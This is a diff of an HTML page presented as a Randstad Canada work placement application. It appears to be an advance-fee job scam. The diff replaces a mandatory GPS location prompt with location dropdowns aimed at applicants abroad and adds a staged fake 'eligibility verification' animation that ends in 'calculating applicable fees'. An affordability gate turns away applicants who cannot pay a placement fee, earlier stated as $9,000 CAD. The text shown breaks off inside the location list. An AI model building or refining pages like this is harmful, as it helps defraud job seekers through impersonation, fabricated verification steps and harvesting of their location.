@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
     <!-- Google tag (gtag.js) -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=AW-7684266895"></script>
@@ -13,7 +13,6 @@
       gtag('config', 'AW-7684266895');
     </script>
 
-    <title>
     <title>Apply | Randstad Canada Work Placement 2026</title>
     <style>
         :root {
@@ -56,13 +55,7 @@
             transition: background 0.2s;
         }
         .hamburger:hover { background: var(--accent); }
-        .hamburger span {
-            display: block;
-            width: 26px;
-            height: 2px;
-            background: var(--secondary);
-            border-radius: 2px;
-        }
+        .hamburger span { display: block; width: 26px; height: 2px; background: var(--secondary); border-radius: 2px; }
 
         /* MENU OVERLAY */
         .menu-overlay {
@@ -113,7 +106,7 @@
         .menu-item.highlight a { color: var(--secondary); font-weight: bold; }
         .menu-item a span { color: #bbb; font-size: 12px; }
 
-        /* HEADER — image clear, text overlay only */
+        /* HEADER */
         header {
             background-image: url('1000024576.jpg');
             background-size: cover;
@@ -123,10 +116,7 @@
             text-align: center;
             position: relative;
         }
-        .header-content {
-            position: relative;
-            z-index: 2;
-        }
+        .header-content { position: relative; z-index: 2; }
         header h1 {
             font-size: 1.7em;
             font-weight: 700;
@@ -158,108 +148,165 @@
         }
         .btn-home:hover { background: #005bb5; }
 
-        /* GPS SECTION */
-        .gps-section {
+        /* LOCATION SELECTOR SECTION */
+        .location-section {
             background: #f9f9f9;
             border-bottom: 1px solid var(--light-border);
-            padding: 24px 20px;
-            text-align: center;
+            padding: 32px 20px;
         }
-        .progress-wrap { display: none; max-width: 420px; margin: 0 auto 10px; }
-        .progress-label {
-            font-size: 13px;
+        .location-section-inner {
+            max-width: 560px;
+            margin: 0 auto;
+            background: white;
+            border: 1px solid var(--light-border);
+            border-top: 4px solid var(--secondary);
+            border-radius: 8px;
+            padding: 28px 24px;
+            box-shadow: var(--card-shadow);
+        }
+        .location-section-inner h2 {
             color: var(--primary);
+            font-size: 1.1em;
+            margin-bottom: 6px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .location-section-inner p {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 24px;
+        }
+        .location-field { margin-bottom: 16px; }
+        .location-field label {
+            display: block;
+            font-size: 13px;
             font-weight: 600;
-            margin-bottom: 8px;
+            color: var(--primary);
+            margin-bottom: 6px;
+        }
+        .location-field select {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+            font-size: 14px;
+            color: #333;
+            background: white;
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath fill='%230076d6' d='M6 8L0 0h12z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 14px center;
+            cursor: pointer;
+            transition: border-color 0.2s;
+        }
+        .location-field select:focus { outline: none; border-color: var(--secondary); box-shadow: 0 0 0 3px rgba(0,118,214,0.1); }
+        .location-field select:disabled { background-color: #f5f5f5; color: #aaa; cursor: not-allowed; }
+        .btn-confirm-location {
+            width: 100%;
+            background: var(--secondary);
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 6px;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            margin-top: 8px;
+            transition: background 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
         }
-        .progress-bar-track { background: #e0e0e0; border-radius: 20px; height: 8px; overflow: hidden; }
-        .progress-bar-fill {
+        .btn-confirm-location:hover { background: #005bb5; }
+        .btn-confirm-location:disabled { background: #aaa; cursor: not-allowed; }
+
+        /* VERIFICATION LOADING */
+        .verify-loading {
+            display: none;
+            max-width: 480px;
+            margin: 32px auto;
+            text-align: center;
+            padding: 40px 24px;
+        }
+        .verify-spinner-wrap {
+            position: relative;
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 24px;
+        }
+        .verify-spinner {
+            width: 80px;
+            height: 80px;
+            border: 4px solid rgba(0,118,214,0.15);
+            border-top-color: var(--secondary);
+            border-radius: 50%;
+            animation: verifySpin 1s linear infinite;
+        }
+        .verify-spinner-inner {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 28px;
+        }
+        @keyframes verifySpin { to { transform: rotate(360deg); } }
+        .verify-title {
+            color: var(--primary);
+            font-size: 1.1em;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+        .verify-subtitle {
+            color: #666;
+            font-size: 13px;
+            margin-bottom: 20px;
+        }
+        .verify-bar-track {
+            background: #e0e0e0;
+            border-radius: 20px;
+            height: 6px;
+            overflow: hidden;
+            max-width: 300px;
+            margin: 0 auto;
+        }
+        .verify-bar-fill {
             height: 100%;
             background: linear-gradient(90deg, var(--secondary), #00c6ff);
             border-radius: 20px;
             width: 0%;
+            transition: width 0.3s ease;
         }
-        @keyframes progressAnim {
-            0% { width: 0%; }
-            30% { width: 40%; }
-            60% { width: 70%; }
-            90% { width: 90%; }
-            100% { width: 95%; }
+        .verify-steps {
+            margin-top: 20px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
+            max-width: 300px;
+            margin: 20px auto 0;
         }
-        .spinner {
-            width: 18px; height: 18px;
-            border: 2px solid rgba(0,118,214,0.3);
-            border-top-color: var(--secondary);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            display: inline-block;
-        }
-        @keyframes spin { to { transform: rotate(360deg); } }
-
-        .gps-banner {
-            max-width: 500px;
-            margin: 0 auto;
-            padding: 14px 18px;
-            border-radius: 6px;
+        .verify-step {
+            display: flex;
+            align-items: center;
+            gap: 10px;
             font-size: 13px;
-            font-weight: 500;
+            color: #aaa;
+            text-align: left;
+            transition: color 0.3s;
         }
-        .gps-banner.waiting { background: var(--accent); border: 1px solid #c8dff7; color: var(--primary); }
-        .gps-banner.success { background: #eafaf1; border: 1px solid #a9dfbf; color: #1a6e35; }
-
-        .gps-denied {
-            display: none;
-            max-width: 480px;
-            margin: 0 auto;
-            background: #fff5f5;
-            border: 2px solid var(--danger);
-            border-radius: 12px;
-            padding: 30px 24px;
-            text-align: center;
+        .verify-step.active { color: var(--primary); font-weight: 600; }
+        .verify-step.done { color: var(--success); }
+        .verify-step-dot {
+            width: 8px;
+            height: 8px;
+            border-radius: 50%;
+            background: #ddd;
+            flex-shrink: 0;
+            transition: background 0.3s;
         }
-        .gps-denied .denied-icon {
-    width: 120px;
-    height: auto;
-    margin: 0 auto 16px;
-    display: block;
-    animation: pulse 1.5s ease-in-out infinite;
-        }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.15); opacity: 0.7; }
-        }
-        .gps-denied h3 { color: var(--danger); font-size: 1.2em; margin-bottom: 10px; }
-        .gps-denied p { color: #721c24; font-size: 13px; line-height: 1.7; margin-bottom: 18px; }
-        .gps-retry-btn {
-            background: var(--danger);
-            color: white;
-            border: none;
-            padding: 12px 28px;
-            border-radius: 6px;
-            font-weight: 700;
-            font-size: 14px;
-            cursor: pointer;
-            transition: background 0.2s;
-        }
-        .gps-retry-btn:hover { background: #b02a37; }
-        .gps-allow-btn {
-            background: var(--secondary);
-            color: white;
-            border: none;
-            padding: 14px 32px;
-            border-radius: 6px;
-            font-weight: 700;
-            font-size: 15px;
-            cursor: pointer;
-            margin-top: 10px;
-            transition: background 0.2s;
-            display: inline-block;
-        }
-        .gps-allow-btn:hover { background: #005bb5; }
+        .verify-step.active .verify-step-dot { background: var(--secondary); }
+        .verify-step.done .verify-step-dot { background: var(--success); }
 
         /* AFFORDABILITY GATE */
         .afford-gate {
@@ -272,6 +319,11 @@
             border-radius: 8px;
             padding: 32px 24px;
             box-shadow: var(--card-shadow);
+            animation: fadeSlideIn 0.5s ease-out;
+        }
+        @keyframes fadeSlideIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
         }
         .afford-gate h2 { color: var(--primary); font-size: 1.15em; margin-bottom: 20px; display: flex; align-items: center; gap: 8px; }
         .location-text {
@@ -432,26 +484,82 @@
     </div>
 </header>
 
-<!-- GPS SECTION -->
-<div class="gps-section" id="gpsSection">
-    <div class="progress-wrap" id="progressWrap">
-        <div class="progress-label">
-            <div class="spinner"></div>
-            Detecting your location, please wait...
+<!-- LOCATION SELECTOR -->
+<div class="location-section" id="locationSection">
+    <div class="location-section-inner">
+        <h2>📍 Select Your Location</h2>
+        <p>Please select your current location to verify regional eligibility and view applicable program conditions.</p>
+
+        <div class="location-field">
+            <label>Continent</label>
+            <select id="selectContinent">
+                <option value="">— Select Continent —</option>
+                <option value="Africa">Africa</option>
+                <option value="Middle East">Middle East</option>
+                <option value="Europe">Europe</option>
+                <option value="North America">North America</option>
+                <option value="Caribbean">Caribbean</option>
+                <option value="South America">South America</option>
+                <option value="Asia">Asia</option>
+                <option value="Australia & Oceania">Australia & Oceania</option>
+            </select>
         </div>
-        <div class="progress-bar-track">
-            <div class="progress-bar-fill" id="progressFill"></div>
+
+        <div class="location-field">
+            <label>Country</label>
+            <select id="selectCountry" disabled>
+                <option value="">— Select Country —</option>
+            </select>
         </div>
+
+        <div class="location-field">
+            <label>Region / State / Province</label>
+            <select id="selectRegion" disabled>
+                <option value="">— Select Region —</option>
+            </select>
+        </div>
+
+        <div class="location-field">
+            <label>City / Town</label>
+            <select id="selectCity" disabled>
+                <option value="">— Select City —</option>
+            </select>
+        </div>
+
+        <button class="btn-confirm-location" id="confirmLocationBtn" disabled>
+            🔍 Confirm My Location & Check Eligibility
+        </button>
     </div>
-    <div class="gps-banner waiting" id="gpsBanner">
-        📍 This application requires your location to verify regional eligibility.<br><br>
-        <button class="gps-allow-btn" id="gpsBtn">📍 Allow Location Access</button>
+</div>
+
+<!-- VERIFICATION LOADING -->
+<div class="verify-loading" id="verifyLoading">
+    <div class="verify-spinner-wrap">
+        <div class="verify-spinner"></div>
+        <div class="verify-spinner-inner">🍁</div>
     </div>
-    <div class="gps-denied" id="gpsDenied">
-        <img src="1000025147.png" class="denied-icon" alt="Allow Location" style="width:120px; height:auto; animation: pulse 1.5s ease-in-out infinite;">
-        <h3>Location Access Required</h3>
-        <p>You have denied location access or it is disabled on your device. This application <strong>requires your GPS location</strong> to verify regional eligibility before you can proceed.<br><br>Please enable location access in your browser settings and try again.</p>
-        <button class="gps-retry-btn" id="retryBtn">🔄 Retry Location Access</button>
+    <div class="verify-title">Verifying Your Regional Eligibility</div>
+    <div class="verify-subtitle">Please wait while we process your location details...</div>
+    <div class="verify-bar-track">
+        <div class="verify-bar-fill" id="verifyBarFill"></div>
+    </div>
+    <div class="verify-steps">
+        <div class="verify-step" id="step1">
+            <div class="verify-step-dot"></div>
+            Confirming location data
+        </div>
+        <div class="verify-step" id="step2">
+            <div class="verify-step-dot"></div>
+            Checking regional program availability
+        </div>
+        <div class="verify-step" id="step3">
+            <div class="verify-step-dot"></div>
+            Calculating applicable fees
+        </div>
+        <div class="verify-step" id="step4">
+            <div class="verify-step-dot"></div>
+            Preparing your eligibility summary
+        </div>
     </div>
 </div>
 
@@ -470,7 +578,7 @@
 <div class="not-eligible" id="notEligible">
     <span class="icon">🙏</span>
     <h3>Thank You for Your Honesty</h3>
-    <p>We appreciate your transparency. Unfortunately, to qualify for the Workforce Mobility & Employment Program at this time, applicants must be able to cover the processing and placement fee of <strong>$9,000 CAD</strong>.</p>
+    <p>We appreciate your transparency. Unfortunately, to qualify for the Workforce Mobility & Employment Program at this time, applicants must be able to cover the processing and placement fee applicable to your region.</p>
     <p>This fee covers essential services including visa facilitation, medical examination, and travel coordination. We encourage you to continue saving toward this goal.</p>
     <p>We sincerely wish you the very best in your journey ahead.</p>
     <button class="btn-restart" id="restartBtn">💳 I Have the Funds — Restart Application</button>
@@ -576,210 +684,554 @@
 </footer>
 
 <script>
-    var detectedAddress = '';
-    var detectedCountry = '';
+// ── MENU ──
+document.getElementById('hamburgerBtn').addEventListener('click', function() {
+    document.getElementById('menuOverlay').classList.add('open');
+    document.body.style.overflow = 'hidden';
+});
+document.getElementById('menuCloseBtn').addEventListener('click', function() {
+    document.getElementById('menuOverlay').classList.remove('open');
+    document.body.style.overflow = '';
+});
+document.getElementById('mobilityLink').addEventListener('click', function(e) {
+    e.preventDefault();
+    document.getElementById('menuOverlay').classList.remove('open');
+    document.body.style.overflow = '';
+    var target = document.getElementById('formContainer');
+    if (target.style.display === 'block') {
+        target.scrollIntoView({ behavior: 'smooth' });
+    } else {
+        document.getElementById('locationSection').scrollIntoView({ behavior: 'smooth' });
+    }
+});
 
-    // ── MENU ──
-    document.getElementById('hamburgerBtn').addEventListener('click', function() {
-        document.getElementById('menuOverlay').classList.add('open');
-        document.body.style.overflow = 'hidden';
+// ── FOOTER ──
+document.querySelectorAll('.footer-section-btn').forEach(function(btn) {
+    btn.addEventListener('click', function() {
+        this.classList.toggle('open');
+        this.nextElementSibling.classList.toggle('open');
     });
-    document.getElementById('menuCloseBtn').addEventListener('click', function() {
-        document.getElementById('menuOverlay').classList.remove('open');
-        document.body.style.overflow = '';
+});
+
+// ── LOCATION DATA ──
+var locationData = {
+    'Africa': {
+        'Ghana': {
+            'Greater Accra': ['Accra', 'Tema', 'Madina', 'Ashaiman', 'Kasoa', 'Adenta', 'Teshie', 'Nungua', 'Dome', 'Achimota'],
+            'Ashanti': ['Kumasi', 'Obuasi', 'Ejisu', 'Konongo', 'Mampong', 'Bekwai', 'Asante Mampong'],
+            'Western': ['Takoradi', 'Sekondi', 'Tarkwa', 'Axim', 'Prestea', 'Bogoso'],
+            'Eastern': ['Koforidua', 'Nkawkaw', 'Suhum', 'Asamankese', 'Oda', 'Nsawam'],
+            'Central': ['Cape Coast', 'Kasoa', 'Winneba', 'Assin Fosu', 'Saltpond', 'Mankessim'],
+            'Volta': ['Ho', 'Keta', 'Hohoe', 'Aflao', 'Kpando', 'Sogakope'],
+            'Northern': ['Tamale', 'Yendi', 'Savelugu', 'Damongo', 'Salaga'],
+            'Upper East': ['Bolgatanga', 'Bawku', 'Navrongo', 'Zebilla'],
+            'Upper West': ['Wa', 'Tumu', 'Jirapa', 'Lawra', 'Nandom'],
+            'Brong-Ahafo': ['Sunyani', 'Techiman', 'Berekum', 'Dormaa Ahenkro', 'Kintampo'],
+            'Oti': ['Dambai', 'Jasikan', 'Nkwanta', 'Kadjebi'],
+            'Savannah': ['Damongo', 'Bole', 'Sawla'],
+            'North East': ['Nalerigu', 'Walewale', 'Gambaga'],
+            'Ahafo': ['Goaso', 'Kukuom', 'Acherensua'],
+            'Bono East': ['Techiman', 'Nkoranza', 'Atebubu'],
+            'Western North': ['Sefwi Wiawso', 'Bibiani', 'Enchi']
+        },
+        'Nigeria': {
+            'Lagos': ['Lagos Island', 'Ikeja', 'Surulere', 'Victoria Island', 'Lekki', 'Ikoyi', 'Yaba', 'Apapa', 'Alimosho', 'Oshodi', 'Mushin', 'Badagry', 'Epe', 'Ikorodu'],
+            'FCT Abuja': ['Garki', 'Wuse', 'Maitama', 'Asokoro', 'Gwarinpa', 'Kubwa', 'Kuje', 'Bwari', 'Gwagwalada'],
+            'Rivers': ['Port Harcourt', 'Obio/Akpor', 'Eleme', 'Ikwerre', 'Bonny', 'Degema'],
+            'Delta': ['Warri', 'Asaba', 'Ughelli', 'Sapele', 'Agbor', 'Abraka'],
+            'Anambra': ['Awka', 'Onitsha', 'Nnewi', 'Ekwulobia', 'Aguata'],
+            'Enugu': ['Enugu', 'Nsukka', 'Oji River', 'Agbani', 'Awgu'],
+            'Imo': ['Owerri', 'Okigwe', 'Orlu', 'Mbaise', 'Oguta'],
+            'Oyo': ['Ibadan', 'Ogbomosho', 'Oyo', 'Iseyin', 'Saki'],
+            'Edo': ['Benin City', 'Auchi', 'Ekpoma', 'Uromi', 'Sapele'],
+            'Akwa Ibom': ['Uyo', 'Eket', 'Ikot Ekpene', 'Oron', 'Abak'],
+            'Cross River': ['Calabar', 'Ikom', 'Ogoja', 'Obudu', 'Akamkpa'],
+            'Kano': ['Kano City', 'Wudil', 'Gaya', 'Bichi', 'Rano'],
+            'Ogun': ['Abeokuta', 'Sagamu', 'Ijebu-Ode', 'Ota', 'Ilaro'],
+            'Ondo': ['Akure', 'Ondo Town', 'Owo', 'Ikare', 'Ore'],
+            'Osun': ['Osogbo', 'Ile-Ife', 'Ilesa', 'Ede', 'Iwo'],
+            'Ekiti': ['Ado-Ekiti', 'Ikere-Ekiti', 'Ijero-Ekiti', 'Efon-Alaye'],
+            'Abia': ['Umuahia', 'Aba', 'Ohafia', 'Bende'],
+            'Bayelsa': ['Yenagoa', 'Brass', 'Ogbia', 'Nembe'],
+            'Ebonyi': ['Abakaliki', 'Afikpo', 'Onueke', 'Ezza'],
+            'Plateau': ['Jos', 'Bukuru', 'Shendam', 'Pankshin'],
+            'Kaduna': ['Kaduna', 'Zaria', 'Kafanchan', 'Kagoro']
+        },
+        'Kenya': {
+            'Nairobi': ['Nairobi CBD', 'Westlands', 'Karen', 'Lavington', 'Kasarani', 'Embakasi'],
+            'Mombasa': ['Mombasa Island', 'Nyali', 'Bamburi', 'Likoni'],
+            'Kisumu': ['Kisumu City', 'Ahero', 'Muhoroni'],
+            'Nakuru': ['Nakuru Town', 'Naivasha', 'Gilgil'],
+            'Eldoret': ['Eldoret Town', 'Turbo', 'Burnt Forest']
+        },
+        'South Africa': {
+            'Gauteng': ['Johannesburg', 'Pretoria', 'Soweto', 'Sandton', 'Midrand'],
+            'Western Cape': ['Cape Town', 'Stellenbosch', 'Paarl', 'George'],
+            'KwaZulu-Natal': ['Durban', 'Pietermaritzburg', 'Richards Bay'],
+            'Eastern Cape': ['Port Elizabeth', 'East London', 'Mthatha'],
+            'Limpopo': ['Polokwane', 'Tzaneen', 'Louis Trichardt']
+        },
+        'Uganda': {
+            'Central': ['Kampala', 'Entebbe', 'Mukono', 'Wakiso'],
+            'Eastern': ['Jinja', 'Mbale', 'Tororo', 'Iganga'],
+            'Western': ['Mbarara', 'Fort Portal', 'Kasese'],
+            'Northern': ['Gulu', 'Lira', 'Arua']
+        },
+        'Tanzania': {
+            'Dar es Salaam': ['Kinondoni', 'Ilala', 'Temeke', 'Kigamboni'],
+            'Arusha': ['Arusha City', 'Moshi', 'Usa River'],
+            'Mwanza': ['Mwanza City', 'Musoma', 'Bukoba'],
+            'Zanzibar': ['Zanzibar City', 'Mkokotoni', 'Chake Chake']
+        },
+        'Senegal': {
+            'Dakar': ['Dakar', 'Pikine', 'Guédiawaye', 'Rufisque'],
+            'Thiès': ['Thiès', 'Mbour', 'Tivaouane'],
+            'Saint-Louis': ['Saint-Louis', 'Richard Toll']
+        },
+        'Côte d\'Ivoire': {
+            'Abidjan': ['Plateau', 'Cocody', 'Yopougon', 'Abobo', 'Marcory'],
+            'Bouaké': ['Bouaké', 'Sakassou'],
+            'Daloa': ['Daloa', 'Issia']
+        },
+        'Cameroon': {
+            'Centre': ['Yaoundé', 'Mbalmayo', 'Obala'],
+            'Littoral': ['Douala', 'Nkongsamba', 'Edéa'],
+            'West': ['Bafoussam', 'Dschang', 'Mbouda'],
+            'South West': ['Buea', 'Limbe', 'Kumba']
+        },
+        'Ethiopia': {
+            'Addis Ababa': ['Addis Ababa', 'Bole', 'Kirkos', 'Yeka'],
+            'Oromia': ['Adama', 'Jimma', 'Dire Dawa', 'Shashemene'],
+            'Amhara': ['Bahir Dar', 'Gondar', 'Dessie']
+        },
+        'Rwanda': {
+            'Kigali': ['Nyarugenge', 'Gasabo', 'Kicukiro'],
+            'Eastern': ['Rwamagana', 'Nyagatare', 'Kayonza'],
+            'Southern': ['Huye', 'Muhanga', 'Nyanza']
+        },
+        'Zimbabwe': {
+            'Harare': ['Harare CBD', 'Chitungwiza', 'Epworth'],
+            'Bulawayo': ['Bulawayo City', 'Nkulumane', 'Mpopoma'],
+            'Mashonaland': ['Bindura', 'Chinhoyi', 'Marondera']
+        },
+        'Zambia': {
+            'Lusaka': ['Lusaka CBD', 'Chilenje', 'Kafue'],
+            'Copperbelt': ['Ndola', 'Kitwe', 'Chingola', 'Mufulira'],
+            'Southern': ['Livingstone', 'Mazabuka', 'Choma']
+        }
+    },
+    'Middle East': {
+        'United Arab Emirates': {
+            'Dubai': ['Dubai City', 'Deira', 'Bur Dubai', 'Jumeirah', 'Dubai Marina'],
+            'Abu Dhabi': ['Abu Dhabi City', 'Al Ain', 'Khalifa City'],
+            'Sharjah': ['Sharjah City', 'Khor Fakkan'],
+            'Ajman': ['Ajman City']
+        },
+        'Saudi Arabia': {
+            'Riyadh': ['Riyadh City', 'Al Olaya', 'Malaz'],
+            'Jeddah': ['Jeddah City', 'Al Balad', 'Al Andalus'],
+            'Mecca': ['Mecca City', 'Taif'],
+            'Medina': ['Medina City', 'Yanbu']
+        },
+        'Qatar': {
+            'Doha': ['Doha City', 'Al Wakrah', 'Al Khor', 'Lusail'],
+            'Al Rayyan': ['Al Rayyan', 'Umm Slal']
+        },
+        'Kuwait': {
+            'Kuwait City': ['Salmiya', 'Hawalli', 'Farwaniya', 'Ahmadi'],
+            'Ahmadi': ['Ahmadi', 'Fahaheel']
+        },
+        'Bahrain': {
+            'Manama': ['Manama', 'Muharraq', 'Riffa', 'Hamad Town']
+        },
+        'Oman': {
+            'Muscat': ['Muscat City', 'Ruwi', 'Muttrah', 'Al Khuwair'],
+            'Salalah': ['Salalah', 'Thumrait']
+        },
+        'Jordan': {
+            'Amman': ['Amman City', 'Zarqa', 'Irbid', 'Aqaba']
+        },
+        'Lebanon': {
+            'Beirut': ['Beirut City', 'Tripoli', 'Sidon', 'Tyre']
+        }
+    },
+    'Europe': {
+        'United Kingdom': {
+            'England': ['London', 'Manchester', 'Birmingham', 'Leeds', 'Liverpool', 'Bristol', 'Sheffield', 'Leicester'],
+            'Scotland': ['Edinburgh', 'Glasgow', 'Aberdeen', 'Dundee'],
+            'Wales': ['Cardiff', 'Swansea', 'Newport'],
+            'Northern Ireland': ['Belfast', 'Derry', 'Lisburn']
+        },
+        'Germany': {
+            'Bavaria': ['Munich', 'Nuremberg', 'Augsburg'],
+            'North Rhine-Westphalia': ['Cologne', 'Dusseldorf', 'Dortmund', 'Essen'],
+            'Berlin': ['Berlin City', 'Charlottenburg', 'Mitte'],
+            'Hamburg': ['Hamburg City', 'Altona', 'Wandsbek']
+        },
+        'France': {
+            'Île-de-France': ['Paris', 'Versailles', 'Boulogne-Billancourt'],
+            'Provence': ['Marseille', 'Nice', 'Toulon'],
+            'Auvergne-Rhône-Alpes': ['Lyon', 'Grenoble', 'Clermont-Ferrand']
+        },
+        'Netherlands': {
+            'North Holland': ['Amsterdam', 'Haarlem', 'Zaandam'],
+            'South Holland': ['Rotterdam', 'The Hague', 'Leiden'],
+            'Utrecht': ['Utrecht', 'Amersfoort']
+        },
+        'Ireland': {
+            'Leinster': ['Dublin', 'Drogheda', 'Dundalk', 'Naas'],
+            'Munster': ['Cork', 'Limerick', 'Waterford', 'Tralee'],
+            'Connacht': ['Galway', 'Sligo', 'Castlebar']
+        },
+        'Spain': {
+            'Catalonia': ['Barcelona', 'Tarragona', 'Lleida'],
+            'Madrid': ['Madrid City', 'Alcalá de Henares', 'Getafe'],
+            'Andalusia': ['Seville', 'Málaga', 'Granada']
+        },
+        'Italy': {
+            'Lombardy': ['Milan', 'Bergamo', 'Brescia'],
+            'Lazio': ['Rome', 'Latina', 'Frosinone'],
+            'Campania': ['Naples', 'Salerno', 'Caserta']
+        },
+        'Portugal': {
+            'Lisbon': ['Lisbon City', 'Sintra', 'Cascais', 'Setúbal'],
+            'Porto': ['Porto City', 'Vila Nova de Gaia', 'Braga'],
+            'Algarve': ['Faro', 'Portimão', 'Lagos']
+        },
+        'Belgium': {
+            'Brussels': ['Brussels City', 'Ixelles', 'Molenbeek'],
+            'Flanders': ['Antwerp', 'Ghent', 'Bruges', 'Leuven'],
+            'Wallonia': ['Liège', 'Namur', 'Charleroi']
+        }
+    },
+    'North America': {
+        'Canada': {
+            'Ontario': ['Toronto', 'Ottawa', 'Mississauga', 'Brampton', 'Hamilton', 'London'],
+            'British Columbia': ['Vancouver', 'Surrey', 'Burnaby', 'Richmond', 'Kelowna'],
+            'Alberta': ['Calgary', 'Edmonton', 'Red Deer', 'Lethbridge'],
+            'Quebec': ['Montreal', 'Quebec City', 'Laval', 'Gatineau'],
+            'Manitoba': ['Winnipeg', 'Brandon', 'Steinbach'],
+            'Saskatchewan': ['Saskatoon', 'Regina', 'Prince Albert']
+        },
+        'United States': {
+            'New York': ['New York City', 'Buffalo', 'Rochester', 'Yonkers', 'Syracuse'],
+            'California': ['Los Angeles', 'San Francisco', 'San Diego', 'Sacramento', 'San Jose'],
+            'Texas': ['Houston', 'Dallas', 'San Antonio', 'Austin', 'Fort Worth'],
+            'Florida': ['Miami', 'Orlando', 'Tampa', 'Jacksonville', 'Fort Lauderdale'],
+            'Georgia': ['Atlanta', 'Savannah', 'Augusta', 'Columbus'],
+            'Illinois': ['Chicago', 'Aurora', 'Naperville', 'Joliet'],
+            'Maryland': ['Baltimore', 'Rockville', 'Gaithersburg', 'Silver Spring'],
+            'New Jersey': ['Newark', 'Jersey City', 'Paterson', 'Elizabeth'],
+            'Minnesota': ['Minneapolis', 'Saint Paul', 'Rochester', 'Duluth']
+        },
+        'Mexico': {
+            'Mexico City': ['Benito Juárez', 'Coyoacán', 'Tlalpan'],
+            'Jalisco': ['Guadalajara', 'Zapopan', 'Tlaquepaque'],
+            'Nuevo León': ['Monterrey', 'San Nicolás', 'Apodaca']
+        }
+    },
+    'Caribbean': {
+        'Jamaica': {
+            'Kingston': ['Kingston City', 'Portmore', 'Spanish Town'],
+            'Saint Andrew': ['Half Way Tree', 'Constant Spring', 'August Town'],
+            'Saint James': ['Montego Bay', 'Falmouth']
+        },
+        'Trinidad and Tobago': {
+            'Port of Spain': ['Port of Spain', 'San Fernando', 'Chaguanas'],
+            'Tobago': ['Scarborough', 'Roxborough']
+        },
+        'Barbados': {
+            'Saint Michael': ['Bridgetown', 'Speightstown'],
+            'Christ Church': ['Oistins', 'Worthing']
+        },
+        'Bahamas': {
+            'New Providence': ['Nassau', 'Cable Beach'],
+            'Grand Bahama': ['Freeport', 'Lucaya']
+        },
+        'Haiti': {
+            'Ouest': ['Port-au-Prince', 'Pétion-Ville', 'Delmas'],
+            'Nord': ['Cap-Haïtien', 'Limbé']
+        },
+        'Guyana': {
+            'Demerara-Mahaica': ['Georgetown', 'Agricola', 'Sophia'],
+            'Berbice': ['New Amsterdam', 'Corriverton']
+        }
+    },
+    'South America': {
+        'Brazil': {
+            'São Paulo': ['São Paulo City', 'Campinas', 'Santos', 'Guarulhos'],
+            'Rio de Janeiro': ['Rio de Janeiro City', 'Niterói', 'Duque de Caxias'],
+            'Minas Gerais': ['Belo Horizonte', 'Uberlândia', 'Contagem']
+        },
+        'Colombia': {
+            'Bogotá': ['Bogotá City', 'Soacha', 'Usme'],
+            'Antioquia': ['Medellín', 'Bello', 'Itagüí'],
+            'Valle del Cauca': ['Cali', 'Buenaventura', 'Palmira']
+        },
+        'Venezuela': {
+            'Caracas': ['Caracas City', 'Petare', 'Macarao'],
+            'Zulia': ['Maracaibo', 'Cabimas'],
+            'Carabobo': ['Valencia', 'Maracay']
+        },
+        'Argentina': {
+            'Buenos Aires': ['Buenos Aires City', 'Córdoba', 'La Plata'],
+            'Córdoba': ['Córdoba City', 'Villa María'],
+            'Mendoza': ['Mendoza City', 'San Rafael']
+        },
+        'Peru': {
+            'Lima': ['Lima City', 'Callao', 'San Juan de Lurigancho'],
+            'Arequipa': ['Arequipa City', 'Cayma'],
+            'La Libertad': ['Trujillo', 'Chimbote']
+        }
+    },
+    'Asia': {
+        'India': {
+            'Maharashtra': ['Mumbai', 'Pune', 'Nagpur', 'Nashik'],
+            'Delhi': ['New Delhi', 'Noida', 'Gurgaon', 'Faridabad'],
+            'Karnataka': ['Bangalore', 'Mysore', 'Hubli'],
+            'Tamil Nadu': ['Chennai', 'Coimbatore', 'Madurai'],
+            'West Bengal': ['Kolkata', 'Howrah', 'Durgapur']
+        },
+        'Philippines': {
+            'Metro Manila': ['Manila', 'Quezon City', 'Makati', 'Pasig', 'Taguig'],
+            'Cebu': ['Cebu City', 'Mandaue', 'Lapu-Lapu'],
+            'Davao': ['Davao City', 'Tagum', 'Digos']
+        },
+        'Pakistan': {
+            'Punjab': ['Lahore', 'Faisalabad', 'Rawalpindi', 'Multan'],
+            'Sindh': ['Karachi', 'Hyderabad', 'Sukkur'],
+            'Khyber Pakhtunkhwa': ['Peshawar', 'Mardan', 'Abbottabad']
+        },
+        'Bangladesh': {
+            'Dhaka': ['Dhaka City', 'Narayanganj', 'Gazipur'],
+            'Chittagong': ['Chittagong City', 'Comilla', 'Cox\'s Bazar'],
+            'Sylhet': ['Sylhet City', 'Moulvibazar']
+        },
+        'Sri Lanka': {
+            'Western': ['Colombo', 'Sri Jayawardenepura Kotte', 'Gampaha'],
+            'Central': ['Kandy', 'Matale', 'Nuwara Eliya'],
+            'Southern': ['Galle', 'Matara', 'Hambantota']
+        },
+        'Nepal': {
+            'Bagmati': ['Kathmandu', 'Lalitpur', 'Bhaktapur'],
+            'Gandaki': ['Pokhara', 'Damauli'],
+            'Lumbini': ['Butwal', 'Bhairahawa']
+        }
+    },
+    'Australia & Oceania': {
+        'Australia': {
+            'New South Wales': ['Sydney', 'Newcastle', 'Wollongong', 'Parramatta'],
+            'Victoria': ['Melbourne', 'Geelong', 'Ballarat', 'Bendigo'],
